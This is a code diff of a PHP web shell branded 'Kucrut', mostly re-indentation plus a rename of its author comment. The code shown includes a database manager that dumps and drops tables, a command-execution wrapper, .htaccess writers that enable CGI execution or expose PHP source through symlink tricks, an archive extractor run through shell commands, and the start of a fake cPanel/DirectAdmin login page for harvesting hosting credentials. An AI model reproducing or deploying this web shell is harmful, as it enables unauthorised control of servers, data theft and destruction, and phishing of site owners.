-							$sql = "\n\t,(".implode(", ", $item).')';
-							if($fp) fwrite($fp, $sql); else echo($sql);
-						}
-						if(!$head)
-							if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
-					}
-				}
-				echo @json_encode(array("status" => true, "file" => $db["dump_file"]));
-			}
-		}elseif($type == "load_tables"){
-			$tables = array();
-			$q_tables = @mysqli_query($conn, "SHOW TABLES;");
-			$count = 0;
-			while($row = @mysqli_fetch_array($q_tables)){
-				if($sql_count){
-					$count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row[0].'`');
-					if($count_q){
-						$count = @mysqli_fetch_row($count_q);
-						$count = $count[0];
-					}
-				}
-				$tables[] = array("name" => $row[0], "count" => (int)$count);
-			}
-			echo @json_encode($tables);
-		}elseif($type == "alter"){
-			$db["alter"]["type"] = strtolower($db["alter"]["type"]);
-			$inputs = $db["alter"]["type"]."(".$db["alter"]["input"].")";
-			$text_input = array("longtext", "text", "mediumtext", "tinytext");
-			if(in_array($db["alter"]["type"], $text_input)){
-				$inputs = $db["alter"]["type"];
-			}
-			@mysqli_query($conn, "ALTER TABLE `".$db["table"]."` MODIFY COLUMN `".$db["column"]."` " . $inputs);
-			$error = @mysqli_error($conn);
-			if($error){
-				echo $error;
-			}else{
-				echo "ok";
-			}
-		}elseif($type == "edit" || $type == "delete" || $type == "delete_all"){
-			if($type == "edit"){
-				$q = @mysqli_query($conn, "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` WHERE `".$db["col_key"]."` = '".addslashes($db["key"])."' LIMIT 0,1");
-				$row = @mysqli_fetch_assoc($q);
-				if($row){
-					$columns_query = @mysqli_query($conn, "SELECT COLUMN_NAME as name, COLUMN_TYPE, DATA_TYPE as type FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$db["db"]."' AND `TABLE_NAME` = '".$db["table"]."'");
-					$columns = array();
-					$edit_data = array();
-					while($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
-						$input = array("col_type" => $row2["COLUMN_TYPE"]);
-						$row2["type"] = strtolower($row2["type"]);
-						switch($row2["type"]){
-							case "longtext": case "text": case "mediumtext": case "tinytext":
-								$input["tag"] = "textarea";
-							break;
-							case "int": case "smallint": case "bigint": case "tinyint": case "mediumint":
-								$input["tag"] = "input";
-								$input["type"] = "number";
-							break;
-							default:
-								$input["tag"] = "input";
-								$input["type"] = "text";
-						}
-						$columns[$row2["name"]] = $input;
-					}
-					foreach($row as $key => $v){
-						$edit_data[] = array("col" => $key, "value" => htmlspecialchars($v, ENT_QUOTES, 'UTF-8'), "type" => $columns[$key]);
-					}
-					echo @json_encode($edit_data);
-				}
-			}else{
-				if($type == "delete_all"){
-					$rows = implode("', '", $db["rows"]);
-				}else{
-					$rows = addslashes($db["key"]);
-				}
-				$query = "DELETE FROM `".$db["db"]."`.`".$db["table"]."` WHERE `".$db["col_key"]."` IN ('".$rows."')";
-				@mysqli_query($conn, $query);
-				$error = @mysqli_error($conn);
-				if($error){
-				 	$status = false;
-				}else{
-				 	$status = true;
-				}
-				echo @json_encode(array("status" => $status, "error" => $error, "query" => $query));
-			}
-		}elseif($type == "update"){
-			$query = "UPDATE `".$db["db"]."`.`".$db["table"]."` SET ";
-			foreach($db["data"] as $col => $val){
-				$query .= "`".$col."` = '".mysqli_real_escape_string($conn, $val)."',";
-			}
-			$query = substr($query, 0, -1);
-		    $query .= "WHERE `".$db["col_key"]."` = '".$db["key"]."'";
-			$res = @mysqli_query($conn, $query);
-			echo @json_encode(array("status" => $res, "error" => @mysqli_error($conn)));
-		}elseif($type == "insert"){
-			$query = "INSERT INTO `".$db["db"]."`.`".$db["table"]."` ";
-			foreach($db["data"] as $col => $val){
-				$cols .= $col . ",";
-				$vals .= "'".mysqli_real_escape_string($conn, $val)."',";
-			}
-			$cols = substr($cols, 0, -1);
-			$vals = substr($vals, 0, -1);
-			$query = $query . "(" . $cols . ")" . "VALUES(" . $vals . ")";
-			$res = @mysqli_query($conn, $query);
-			echo @json_encode(array("status" => $res, "error" => @mysqli_error($conn)));
-		}else{
-			$pages = 0;
-			$title = false;
-			$query = "";
-			$tbl_content = '<table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
-			$line = 0;
-			$tables = array();
-			$columns = array();
-			if($type == "load_data"){
-				$query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` LIMIT 0,30";
-				$tbl_count_q = @mysqli_query($conn, "SELECT COUNT(*) FROM `".$db["db"]."`.`".$db["table"]."`");
-				$tbl_count = @mysqli_fetch_row($tbl_count_q);
-				$columns_query = @mysqli_query($conn, "SELECT COLUMN_NAME as name, COLUMN_TYPE as type, COLLATION_NAME as collation, DATA_TYPE as data_type, CHARACTER_MAXIMUM_LENGTH as type_value FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$db["db"]."' AND `TABLE_NAME` = '".$db["table"]."'");
-				while($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
-					$columns[] = $row2;
-				}
-				if($tbl_count[0] > 30){
-					$pages = ceil($tbl_count[0] / 30);
-				}
-			}elseif($type == "query"){
-				$query = $db["query"];
-			}elseif($type == "page"){
-				$db["page"] = (int)$db["page"] - 1;
-				$query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` LIMIT ".($db["page"]*30).",30";
-			}elseif($type == "search"){
-				$search = "";
-				$search_noval = array("= ''", "!= ''", "IS NULL", "IS NOT NULL");
-				foreach($db["search"] as $col => $val){
-					$search_noval_r = in_array($val["opt"], $search_noval);
-					if(empty($val["value"]) && !$search_noval_r)continue;
-					if(strstr($val["opt"], "...") || $search_noval_r){
-						$val["opt"] = str_replace("...", $val["value"], $val["opt"]);
-						$search .= $col . " " . $val["opt"] . " AND ";
-					}else{
-						$search .= $col . " " . $val["opt"] . " '".addslashes($val["value"])."' AND ";
-					}
-				}
-				$search .= "1=1";
-				$query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` WHERE " . $search;
-			}
-			$q_tables = @mysqli_query($conn, $query);
-			if(!$q_tables){
-				echo @json_encode(array("status" => false, "error" => @mysqli_error($conn), "query" => $query));
-				return false;
-			}
-			$col_key = @mysqli_query($conn, "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '".@addslashes($db["db"])."' AND TABLE_NAME = '".@addslashes($db["table"])."' AND COLUMN_KEY = 'PRI'");
-			if($col_key){
-				$col_key = @mysqli_fetch_row($col_key);
-				$col_key = $col_key[0];
-				if(!empty($col_key)){
-					$tbl_content = '<div style="margin-bottom:5px;margin-top:5px;"><button col_key="'.$col_key.'" tbl_name="'.$db["table"].'" db_id="'.$db["db_id"].'" 	db_target="'.$db["db"].'" onclick="kucrutMysqlDeleteAllSelectedrows(this);return false;">Delete Selected Rows</button></div><table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
-				}
-			}else{
-				$col_key = false;
-			}
-			while($item = @mysqli_fetch_assoc($q_tables)){
-				if(!$title){
-					$tbl_content .= '<tr style="background-color:#305b8e;">';
-					if($col_key){
-						$tbl_content .= '<th style="width: 55px;text-align:center;"><input db_id="'.$db["db_id"].'" onchange="kucrutMysqlTblSelectAll(this);" type="checkbox"></th><th style="width: 55px;text-align:center;">Edit</th><th style="width: 55px;text-align:center;">Delete</th>';
-					}
-					foreach($item as $key => $value){
-						$tbl_content .= '<th>'.$key.'</th>';
-					}
-					reset($item);
-					$title=true;
-					$tbl_content .= '</tr><tr>';
-				}
+    $db = $_POST["kucrut1"];
+    $type = $_POST["kucrut2"];
+    $sql_count = $_POST["kucrut3"] == "true" ? true : false;
+    $db = @json_decode($db, true);
+    $conn = @mysqli_connect($db["host"], $db["user"], $db["pass"], $db["db"]);
+    @mysqli_set_charset($conn, "utf8");
+    if($conn){
+        if($type == "load_all_tables"){
+            $tables = array();
+            $q_tables = @mysqli_query($conn, "SELECT `table_schema`, `table_name` FROM `information_schema`.`tables` WHERE `table_schema` IN ('".implode("','", $db["databases"])."');");
+            $count = 0;
+            while($row = @mysqli_fetch_assoc($q_tables)){
+                if($sql_count){
+                    $count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row["table_schema"].'`.`'.$row["table_name"].'`');
+                    if($count_q){
+                        $count = @mysqli_fetch_row($count_q);
+                        $count = $count[0];
+                    }
+                }
+                $tables[$row["table_schema"]][] = array("name" => $row["table_name"], "count" => (int)$count);
+            }
+            foreach($db["databases"] as $db){
+                if(!isset($tables[$db])){
+                    $tables[$db] = null;
+                }
+            }
+            echo @json_encode($tables);
+        }elseif($type == "dump_drop"){
+            if($db["mode"] == "drop"){
+                foreach ($db["tables"] as $table) {
+                    @mysqli_query($conn, "DROP TABLE `".$table."`;");
+                }
+                $tables = array();
+                $q_tables = @mysqli_query($conn, "SHOW TABLES;");
+                $count = 0;
+                while($row = @mysqli_fetch_array($q_tables)){
+                    if($sql_count){
+                        $count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row[0].'`');
+                        if($count_q){
+                            $count = @mysqli_fetch_row($count_q);
+                            $count = $count[0];
+                        }
+                    }
+                    $tables[] = array("name" => $row[0], "count" => (int)$count);
+                }
+                echo @json_encode($tables);
+            }else{
+                if(strlen(kucrutEx("mysqldump"))>0){
+                    kucrutEx("mysqldump --single-transaction --host=\"".$db["host"]."\" --user=\"".$db["user"]."\" --password=\"".$db["pass"]."\" ".$db["db"]." ".implode(" ", $db["tables"])."  > ".$db["dump_file"]);
+                }else{
+                    $fp = @fopen($db["dump_file"], "w");
+                    foreach ($db["tables"] as $table) {
+                        $res = @mysqli_query($conn, 'SHOW CREATE TABLE `'.$table.'`');
+                        $create = @mysqli_fetch_array($res);
+                        $sql = "DROP TABLE IF EXISTS `".$table."`;\n" . $create[1].";\n";
+                        if($fp) fwrite($fp, $sql); else echo($sql);
+                        $tbl_data = @mysqli_query($conn, 'SELECT * FROM `'.$table.'`');
+                        $head = true;
+                        while($item = @mysqli_fetch_assoc($tbl_data)){
+                            $columns = array();
+                            foreach($item as $k=>$v) {
+                            if($v == null)
+                            $item[$k] = "''";
+                            elseif(is_numeric($v))
+                            $item[$k] = $v;
+                            else
+                            $item[$k] = "'".@mysqli_real_escape_string($conn, $v)."'";
+                            $columns[] = "`".$k."`";
+                            }
+                            if($head) {
+                            $sql = 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $item).')';
+                            $head = false;
+                            } else
+                            $sql = "\n\t,(".implode(", ", $item).')';
+                            if($fp) fwrite($fp, $sql); else echo($sql);
+                        }
+                        if(!$head)
+                            if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
+                    }
+                }
+                echo @json_encode(array("status" => true, "file" => $db["dump_file"]));
+            }
+        }elseif($type == "load_tables"){
+            $tables = array();
+            $q_tables = @mysqli_query($conn, "SHOW TABLES;");
+            $count = 0;
+            while($row = @mysqli_fetch_array($q_tables)){
+                if($sql_count){
+                    $count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row[0].'`');
+                    if($count_q){
+                        $count = @mysqli_fetch_row($count_q);
+                        $count = $count[0];
+                    }
+                }
+                $tables[] = array("name" => $row[0], "count" => (int)$count);
+            }
+            echo @json_encode($tables);
+        }elseif($type == "alter"){
+            $db["alter"]["type"] = strtolower($db["alter"]["type"]);
+            $inputs = $db["alter"]["type"]."(".$db["alter"]["input"].")";
+            $text_input = array("longtext", "text", "mediumtext", "tinytext");
+            if(in_array($db["alter"]["type"], $text_input)){
+                $inputs = $db["alter"]["type"];
+            }
+            @mysqli_query($conn, "ALTER TABLE `".$db["table"]."` MODIFY COLUMN `".$db["column"]."` " . $inputs);
+            $error = @mysqli_error($conn);
+            if($error){
+                echo $error;
+            }else{
+                echo "ok";
+            }
+        }elseif($type == "edit" || $type == "delete" || $type == "delete_all"){
+            if($type == "edit"){
+                $q = @mysqli_query($conn, "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` WHERE `".$db["col_key"]."` = '".addslashes($db["key"])."' LIMIT 0,1");
+                $row = @mysqli_fetch_assoc($q);
+                if($row){
+                    $columns_query = @mysqli_query($conn, "SELECT COLUMN_NAME as name, COLUMN_TYPE, DATA_TYPE as type FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$db["db"]."' AND `TABLE_NAME` = '".$db["table"]."'");
+                    $columns = array();
+                    $edit_data = array();
+                    while($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
+                        $input = array("col_type" => $row2["COLUMN_TYPE"]);
+                        $row2["type"] = strtolower($row2["type"]);
+                        switch($row2["type"]){
+                            case "longtext": case "text": case "mediumtext": case "tinytext":
+                                $input["tag"] = "textarea";
+                            break;
+                            case "int": case "smallint": case "bigint": case "tinyint": case "mediumint":
+                                $input["tag"] = "input";
+                                $input["type"] = "number";
+                            break;
+                            default:
+                                $input["tag"] = "input";
+                                $input["type"] = "text";
+                        }
+                        $columns[$row2["name"]] = $input;
+                    }
+                    foreach($row as $key => $v){
+                        $edit_data[] = array("col" => $key, "value" => htmlspecialchars($v, ENT_QUOTES, 'UTF-8'), "type" => $columns[$key]);
+                    }
+                    echo @json_encode($edit_data);
+                }
+            }else{
+                if($type == "delete_all"){
+                    $rows = implode("', '", $db["rows"]);
+                }else{
+                    $rows = addslashes($db["key"]);
+                }
+                $query = "DELETE FROM `".$db["db"]."`.`".$db["table"]."` WHERE `".$db["col_key"]."` IN ('".$rows."')";
+                @mysqli_query($conn, $query);
+                $error = @mysqli_error($conn);
+                if($error){
+                    $status = false;
+                }else{
+                    $status = true;
+                }
+                echo @json_encode(array("status" => $status, "error" => $error, "query" => $query));
+            }
+        }elseif($type == "update"){
+            $query = "UPDATE `".$db["db"]."`.`".$db["table"]."` SET ";
+            foreach($db["data"] as $col => $val){
+                $query .= "`".$col."` = '".mysqli_real_escape_string($conn, $val)."',";
+            }
+            $query = substr($query, 0, -1);
+            $query .= "WHERE `".$db["col_key"]."` = '".$db["key"]."'";
+            $res = @mysqli_query($conn, $query);
+            echo @json_encode(array("status" => $res, "error" => @mysqli_error($conn)));
+        }elseif($type == "insert"){
+            $query = "INSERT INTO `".$db["db"]."`.`".$db["table"]."` ";
+            foreach($db["data"] as $col => $val){
+                $cols .= $col . ",";
+                $vals .= "'".mysqli_real_escape_string($conn, $val)."',";
+            }
+            $cols = substr($cols, 0, -1);
+            $vals = substr($vals, 0, -1);
+            $query = $query . "(" . $cols . ")" . "VALUES(" . $vals . ")";
+            $res = @mysqli_query($conn, $query);
+            echo @json_encode(array("status" => $res, "error" => @mysqli_error($conn)));
+        }else{
+            $pages = 0;
+            $title = false;
+            $query = "";
+            $tbl_content = '<table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
+            $line = 0;
+            $tables = array();
+            $columns = array();
+            if($type == "load_data"){
+                $query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` LIMIT 0,30";
+                $tbl_count_q = @mysqli_query($conn, "SELECT COUNT(*) FROM `".$db["db"]."`.`".$db["table"]."`");
+                $tbl_count = @mysqli_fetch_row($tbl_count_q);
+                $columns_query = @mysqli_query($conn, "SELECT COLUMN_NAME as name, COLUMN_TYPE as type, COLLATION_NAME as collation, DATA_TYPE as data_type, CHARACTER_MAXIMUM_LENGTH as type_value FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$db["db"]."' AND `TABLE_NAME` = '".$db["table"]."'");
+                while($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
+                    $columns[] = $row2;
+                }
+                if($tbl_count[0] > 30){
+                    $pages = ceil($tbl_count[0] / 30);
+                }
+            }elseif($type == "query"){
+                $query = $db["query"];
+            }elseif($type == "page"){
+                $db["page"] = (int)$db["page"] - 1;
+                $query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` LIMIT ".($db["page"]*30).",30";
+            }elseif($type == "search"){
+                $search = "";
+                $search_noval = array("= ''", "!= ''", "IS NULL", "IS NOT NULL");
+                foreach($db["search"] as $col => $val){
+                    $search_noval_r = in_array($val["opt"], $search_noval);
+                    if(empty($val["value"]) && !$search_noval_r)continue;
+                    if(strstr($val["opt"], "...") || $search_noval_r){
+                        $val["opt"] = str_replace("...", $val["value"], $val["opt"]);
+                        $search .= $col . " " . $val["opt"] . " AND ";
+                    }else{
+                        $search .= $col . " " . $val["opt"] . " '".addslashes($val["value"])."' AND ";
+                    }
+                }
+                $search .= "1=1";
+                $query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` WHERE " . $search;
+            }
+            $q_tables = @mysqli_query($conn, $query);
+            if(!$q_tables){
+                echo @json_encode(array("status" => false, "error" => @mysqli_error($conn), "query" => $query));
+                return false;
+            }
+            $col_key = @mysqli_query($conn, "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '".@addslashes($db["db"])."' AND TABLE_NAME = '".@addslashes($db["table"])."' AND COLUMN_KEY = 'PRI'");
+            if($col_key){
+                $col_key = @mysqli_fetch_row($col_key);
+                $col_key = $col_key[0];
+                if(!empty($col_key)){
+                    $tbl_content = '<div style="margin-bottom:5px;margin-top:5px;"><button col_key="'.$col_key.'" tbl_name="'.$db["table"].'" db_id="'.$db["db_id"].'"  db_target="'.$db["db"].'" onclick="kucrutMysqlDeleteAllSelectedrows(this);return false;">Delete Selected Rows</button></div><table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
+                }
+            }else{
+                $col_key = false;
+            }
+            while($item = @mysqli_fetch_assoc($q_tables)){
+                if(!$title){
+                    $tbl_content .= '<tr style="background-color:#305b8e;">';
+                    if($col_key){
+                        $tbl_content .= '<th style="width: 55px;text-align:center;"><input db_id="'.$db["db_id"].'" onchange="kucrutMysqlTblSelectAll(this);" type="checkbox"></th><th style="width: 55px;text-align:center;">Edit</th><th style="width: 55px;text-align:center;">Delete</th>';
+                    }
+                    foreach($item as $key => $value){
+                        $tbl_content .= '<th>'.$key.'</th>';
+                    }
+                    reset($item);
+                    $title=true;
+                    $tbl_content .= '</tr><tr>';
+                }
 
-				if($col_key){
-					$cacheMsg = '<td style="text-align:center;"><input row_id="'.$line.'" type="checkbox" name="tbl_rows_checkbox[]" value="'.$item[$col_key].'"></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" onclick="kucrutMysqlEditRow(this, \'edit\');" style="color:#0acaa6;">Edit</a></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" row_id="'.$line.'" onclick="kucrutMysqlEditRow(this, \'delete\');" style="color:#ff1e1e;">Delete</a></td>';
-				}
-				$tbl_content .= '<tr class="tbl_row tbl_row_l'.$line.'">'.$cacheMsg;
-				$line++;
-				foreach($item as $key => $value){
-					if($value == null){
-						$tbl_content .= '<td><i>null</i></td>';
-					}else{
-						$tbl_content .= '<td>'.nl2br(htmlspecialchars($value)).'</td>';
-				}
-				}
-				$tbl_content .= '</tr>';
-			}
-			$tbl_content .= '</table>';
-			if(!$title){
-				$tbl_content = "<div style='padding:5px;border:1px dashed;margin:10px;'>Table is empty...</div>";
-			}
-			echo @json_encode(array("status" => true, "table" => $tbl_content, "columns" => $columns, "pages" => $pages, "query" => $query));
-		}
-		@mysqli_close($conn);
-	}
+                if($col_key){
+                    $cacheMsg = '<td style="text-align:center;"><input row_id="'.$line.'" type="checkbox" name="tbl_rows_checkbox[]" value="'.$item[$col_key].'"></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" onclick="kucrutMysqlEditRow(this, \'edit\');" style="color:#0acaa6;">Edit</a></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" row_id="'.$line.'" onclick="kucrutMysqlEditRow(this, \'delete\');" style="color:#ff1e1e;">Delete</a></td>';
+                }
+                $tbl_content .= '<tr class="tbl_row tbl_row_l'.$line.'">'.$cacheMsg;
+                $line++;
+                foreach($item as $key => $value){
+                    if($value == null){
+                        $tbl_content .= '<td><i>null</i></td>';
+                    }else{
+                        $tbl_content .= '<td>'.nl2br(htmlspecialchars($value)).'</td>';
+                }
+                }
+                $tbl_content .= '</tr>';
+            }
+            $tbl_content .= '</table>';
+            if(!$title){
+                $tbl_content = "<div style='padding:5px;border:1px dashed;margin:10px;'>Table is empty...</div>";
+            }
+            echo @json_encode(array("status" => true, "table" => $tbl_content, "columns" => $columns, "pages" => $pages, "query" => $query));
+        }
+        @mysqli_close($conn);
+    }
 }
 function kucrutselfrm(){
 if(isset($_POST['kucrut1'])&&$_POST['kucrut1']=='yes'){
@@ -5550,9 +5550,9 @@ function kucrutcgihtaccess($m,$d='', $symname=false){
 $readme = "";
 if($symname){$readme="\nReadmeName ".trim($symname);}
 if($m=='cgi'){
-$code = "#Coded By Tobrut Style\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .kucrut\nAddHandler cgi-script .kucrut";
+$code = "#Coded By Kucrut Team\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .kucrut\nAddHandler cgi-script .kucrut";
 }elseif($m=='sym'){
-$code = "#Coded By Tobrut Style\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
+$code = "#Coded By Kucrut Team\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
 }elseif($m=='shtml'){
 $code = "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml";
 }
@@ -5692,30 +5692,30 @@ echo '</div>';
 kucrutfooter();
 }
 function __kucrutziper($source,$destination){
-	if(!extension_loaded('zip')||!file_exists($source)){
-		return false;
-	}
-	$zip=new ZipArchive();
-	if(!$zip->open($destination,ZIPARCHIVE::CREATE)){
-		return false;
-	}
-	$source=str_replace('\\','/',realpath($source));
-	if(is_dir($source)===true){
-		$files=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source),RecursiveIteratorIterator::SELF_FIRST);
-		foreach($files as $file){
-			$file=str_replace('\\','/',$file);
-			if(in_array(substr($file,strrpos($file,'/')+1),array('.','..')))continue;
-			$file=realpath($file);
-			if(is_dir($file)===true){
-				$zip->addEmptyDir(str_replace($source.'/','',$file.'/'));
-			}else if(is_file($file)===true){
-				$zip->addFromString(str_replace($source.'/','',$file),file_get_contents($file));
-			}
-		}
-	}else if(is_file($source)===true){
-		$zip->addFromString(basename($source),file_get_contents($source));
-	}
-	return $zip->close();
+    if(!extension_loaded('zip')||!file_exists($source)){
+        return false;
+    }
+    $zip=new ZipArchive();
+    if(!$zip->open($destination,ZIPARCHIVE::CREATE)){
+        return false;
+    }
+    $source=str_replace('\\','/',realpath($source));
+    if(is_dir($source)===true){
+        $files=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source),RecursiveIteratorIterator::SELF_FIRST);
+        foreach($files as $file){
+            $file=str_replace('\\','/',$file);
+            if(in_array(substr($file,strrpos($file,'/')+1),array('.','..')))continue;
+            $file=realpath($file);
+            if(is_dir($file)===true){
+                $zip->addEmptyDir(str_replace($source.'/','',$file.'/'));
+            }else if(is_file($file)===true){
+                $zip->addFromString(str_replace($source.'/','',$file),file_get_contents($file));
+            }
+        }
+    }else if(is_file($source)===true){
+        $zip->addFromString(basename($source),file_get_contents($source));
+    }
+    return $zip->close();
 }
 function kucrutdeziper(){
 kucruthead();
@@ -5730,7 +5730,7 @@ if(isset($_POST['kucrut5']) && ($_POST['kucrut5'] == '>>')){
 $dirzip = $_POST['kucrut3'];
 $zipfile = $_POST['kucrut4'];
 if(@!is_dir($zipfile)){
-	@mkdir($zipfile, 0777, true);
+    @mkdir($zipfile, 0777, true);
 }
 $finfo = "";
 $file_type = "";
@@ -5739,67 +5739,67 @@ $finfo = @finfo_open(FILEINFO_MIME_TYPE);
 $file_type = @finfo_file($finfo, $dirzip);
 @finfo_close($finfo);
 }else{
-	if($GLOBALS['sys']=='unix'&&_kucrut_can_runCommand(true,true)){
-		$file_type = kucrutEx('file -b --mime-type ' . $dirzip);
-	}
+    if($GLOBALS['sys']=='unix'&&_kucrut_can_runCommand(true,true)){
+        $file_type = kucrutEx('file -b --mime-type ' . $dirzip);
+    }
 }
 if($GLOBALS['sys']!='unix'&&_kucrut_can_runCommand(true,true)){
 kucrutEx("powershell expand-archive -path '".addslashes($dirzip)."' -destinationpath '".addslashes(basename($zipfile))."'");
 echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
 }elseif($GLOBALS['sys']=='unix'&&!empty($file_type)&&_kucrut_can_runCommand(true,true)&&(strlen(kucrutEx('which unzip')) > 0||strlen(kucrutEx('which tar')) > 0||strlen(kucrutEx('which gunzip')) > 0)){
 switch ($file_type) {
-	case 'application/zip':
-		kucrutEx("cd '".addslashes($zipfile)."';unzip '".addslashes($dirzip)."'");
-	break;
-	case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
-		if(strstr(basename($dirzip), ".tar.gz")||strstr(basename($dirzip), ".tar")){
-			kucrutEx("cd '".addslashes($zipfile)."';tar xzf '".addslashes($dirzip)."'");
-		}else{
-			kucrutEx("cd '".addslashes($zipfile)."';gunzip '".addslashes($dirzip)."'");
-		}
-	break;
+    case 'application/zip':
+        kucrutEx("cd '".addslashes($zipfile)."';unzip '".addslashes($dirzip)."'");
+    break;
+    case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
+        if(strstr(basename($dirzip), ".tar.gz")||strstr(basename($dirzip), ".tar")){
+            kucrutEx("cd '".addslashes($zipfile)."';tar xzf '".addslashes($dirzip)."'");
+        }else{
+            kucrutEx("cd '".addslashes($zipfile)."';gunzip '".addslashes($dirzip)."'");
+        }
+    break;
 }
 echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\''.$zipfile.'\');">[ View Folder ]</a></b></p></center>';
 }elseif(class_exists('ZipArchive')){
-	$itsok = false;
-	if(emtpy($file_type)){
-		$file_type = "application/zip";
-	}
-	switch ($file_type) {
-		case 'application/zip':
-			$zip = new ZipArchive;
-			$res = $zip->open($dirzip);
-			if ($res) {
-				$zip->extractTo($zipfile);
-				$zip->close();
-				$itsok = true;
-			}
-		break;
-		case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
-			if(strstr(basename($dirzip), ".tar.gz")){
-				$new_file = $zipfile .'/'. basename($dirzip);
-				@copy($dirzip, $new_file);
-				$new_tar = str_replace(".tar.gz", ".tar", $new_file);
-				try {
-					$p = new PharData($new_file);
-					$p->decompress();
-					$phar = new PharData($new_tar);
-					$phar->extractTo($zipfile);
-					@unlink($new_file);
-					@unlink($new_tar);
-					$itsok = true;
-				} catch (Exception $e) {
-				}
-			}else{
-				try {
-					$phar = new PharData($dirzip);
-					$phar->extractTo($zipfile);
-					$itsok = true;
-				} catch (Exception $e) {
-				}
-			}
-		break;
-	}
+    $itsok = false;
+    if(emtpy($file_type)){
+        $file_type = "application/zip";
+    }
+    switch ($file_type) {
+        case 'application/zip':
+            $zip = new ZipArchive;
+            $res = $zip->open($dirzip);
+            if ($res) {
+                $zip->extractTo($zipfile);
+                $zip->close();
+                $itsok = true;
+            }
+        break;
+        case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
+            if(strstr(basename($dirzip), ".tar.gz")){
+                $new_file = $zipfile .'/'. basename($dirzip);
+                @copy($dirzip, $new_file);
+                $new_tar = str_replace(".tar.gz", ".tar", $new_file);
+                try {
+                    $p = new PharData($new_file);
+                    $p->decompress();
+                    $phar = new PharData($new_tar);
+                    $phar->extractTo($zipfile);
+                    @unlink($new_file);
+                    @unlink($new_tar);
+                    $itsok = true;
+                } catch (Exception $e) {
+                }
+            }else{
+                try {
+                    $phar = new PharData($dirzip);
+                    $phar->extractTo($zipfile);
+                    $itsok = true;
+                } catch (Exception $e) {
+                }
+            }
+        break;
+    }
 if($itsok){
 echo __pre().'<center><p><font color="green">Success...!<br>'.$zipfile.'</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\''.$zipfile.'\');">[ View Folder ]</a></p></center>';
 }else{echo __pre().'<center><p><font color="red">ERROR!!!...</font></p></center>';}
@@ -6017,207 +6017,207 @@ Kucrut_StrSearcher($path,$string,$ext,$e,$results);
 $results[] = $path;
 }}}}
 function kucrutfakepage(){
-	kucruthead();
-	KucrutNum(9,10);
-	echo '<div class=header><br>
-	<center><div class="txtfont_header">| Host Manager Fake page |</div></center><br><br><form onSubmit="g(\'fakepage\',null,this.clone_page.value,this.fake_root.value,\'>>\',this.logto.value,this.panel.value,this.inject_to.value,this.bind_on.value,this.count.value);return false;" method=\'post\'>
-	<div class="txtfont" style="position: relative;left: 50%;transform: translate(-50%);"><div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Panel: </span><select style="width:100px;" name="panel">';
-	$cm_array = array("cpanel"=>"Cpanel","directadmin"=>"DirectAdmin");
